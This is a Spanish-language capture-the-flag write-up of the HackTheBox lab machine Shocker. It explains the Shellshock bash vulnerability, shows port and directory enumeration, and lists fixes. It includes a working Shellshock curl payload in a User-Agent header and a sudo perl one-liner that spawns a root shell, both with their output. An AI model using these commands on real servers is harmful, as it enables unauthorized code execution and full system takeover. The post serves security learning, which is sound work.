---
layout: single
title:  Shocker
excerpt: "Maquina Shocker de la Plataforma HackTheBox, posee una dificultad facil con una vulnerabilidad bastante conocida que la época en que fue descubierto afectó a millones de servidores. públicos"
date: 2021-07-20
classes: wide
header:
    teaser: /assets/images/que-es-un-socket-y-como-funciona/portada.png
    teaser_home_page: true
categories:
    - WriteUp
tags:
    - Linux
    - HTB
---


# Sistema Vulnerable: 10.10.10.56
## Explicacaión de la vulnerabilidad.
Shellshock apareció por primera vez en septiembre de 2014. Hubo informes de ataques a las pocas horas de la divulgación inicial de la vulnerabilidad, y en los días siguientes, hubo millones de ataques y sondeos provenientes de botnets.  
Bash es un shell o intérprete que permite que los comandos se ejecuten en un sistema, generalmente a través de una ventana de texto. Por lo general, es el shell predeterminado en los sistemas Unix, y como tal, se puede encontrar en Linux, macOS y otros varios sabores de Unix. Esta es la razón por la que Shellshock es tan grave: más de la mitad de los servidores web en Internet ejecutan Unix, sin mencionar una gran cantidad de dispositivos IoT e incluso algunos enrutadores/módems.  


Esencialmente, Shellshock funciona al permitir que un atacante agregue comandos a las definiciones de funciones en los valores de las variables de entorno. Esto se clasificaría como un tipo de ataque de inyección de código, y dado que Bash procesará estos comandos después de la definición de la función, se puede ejecutar casi cualquier código arbitrario.  
Shellshock es en realidad una familia completa de vulnerabilidades que consiste en múltiples vectores de explotación.  

[- https://securityhacklabs.net/articulo/seguridad-web-explotando-shellshock-en-un-servidor-web-usando-metasploit](https://securityhacklabs.net/articulo/seguridad-web-explotando-shellshock-en-un-servidor-web-usando-metasploit)
[- https://en.wikipedia.org/wiki/Shellshock_(software_bug)](https://en.wikipedia.org/wiki/Shellshock_(software_bug))


## Vulnerabilidad de escalamiento de privilegios:  
sudo es un programa que permite a los usuarios ejecutar otros programas con privilegios de otros usuarios. De forma predeterminada, ese otro usuario será root.
Un usuario generalmente necesita ingresar su contraseña para usar sudo, y se debe permitir el acceso a través de reglas en el archivo **/etc/sudoers**.   
[https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/)  

------

## Corrección de la vulnerabilidad:
- Actualize bash a su versión mas reciente de su sistema.  
- Configurar de manera eficaz los permisos que se otorgan a los usuarios del sistema.  

## Gravedad :
Crítica

## Prueba de concepto:
[- https://www.exploit-db.com/exploits/34766](https://www.exploit-db.com/exploits/34766)  
```bash
$ curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id'" http://10.10.10.56/cgi-bin/user.sh
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

### Enumeración:
Enumeración de puertos TCP
```bash
$ nmap -p- --min-rate 10000 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 06:29 EDT
Nmap scan report for 10.10.10.56
Host is up (0.025s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

$ nmap -p 80,2222 -sCV -oN targeted 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 06:30 EDT
Nmap scan report for 10.10.10.56
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds

```

## Pasos para explotar el sistema:
### Punto de apoyo:
<p align="center">
<img src="/assets/images/htb/shocker/1.PNG">
</p>

Fuerza bruta al servidor web.  
```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56/FUZZ -c -t 200
                                                                                                                          
        /'___\  /'___\           /'___\                                                                                   
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                   
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                  
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                   

       v1.3.0 Kali Exclusive <3
________________________________________________                              
                                                                                              
 :: Method           : GET                                                                    
 :: URL              : http://10.10.10.56/FUZZ                                                                            
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt                           
 :: Follow redirects : false                                                                  
 :: Calibration      : false                                                                  
 :: Timeout          : 10                                                                                                 
 :: Threads          : 200                                                                    
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405                 
________________________________________________                                    
                                                                                              
                        [Status: 200, Size: 137, Words: 9, Lines: 10]                   
.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]                                                    
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]                        
cgi-bin/                [Status: 403, Size: 294, Words: 22, Lines: 12]                        
index.html              [Status: 200, Size: 137, Words: 9, Lines: 10]                                                     
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]                                                    
:: Progress: [4615/4615] :: Job [1/1] :: 597 req/sec :: Duration: [0:00:04] :: Errors: 0 ::   

```

<p align="center">
<img src="/assets/images/whtb/shocker/2.PNG">
</p>

Fuerza bruta al sistema web enumerando archivos con extension sh, py,pl,cgi.
```bash
$ gobuster dir -q -e -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,py,pl,cgi -t 200 
http://10.10.10.56/cgi-bin/.htpasswd (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.sh (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.sh (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.py (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.pl (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.cgi (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.py (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.pl (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.cgi (Status: 403)
http://10.10.10.56/cgi-bin/.hta (Status: 403)
http://10.10.10.56/cgi-bin/.hta.sh (Status: 403)
http://10.10.10.56/cgi-bin/.hta.py (Status: 403)
http://10.10.10.56/cgi-bin/.hta.pl (Status: 403)
http://10.10.10.56/cgi-bin/.hta.cgi (Status: 403)
http://10.10.10.56/cgi-bin/user.sh (Status: 200)
```

Visualizando el recurso encontrado.  
```bash
$ curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 18:20:37 up 22 min,  0 users,  load average: 0.00, 0.00, 0.00
 ```

### Obteniendo shell inversa:
<p align="center">
<img src="/assets/images/htb/shocker/3.PNG">
</p>


### Escalada de privilegios:
```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
# id
id
uid=0(root) gid=0(root) groups=0(root)

```
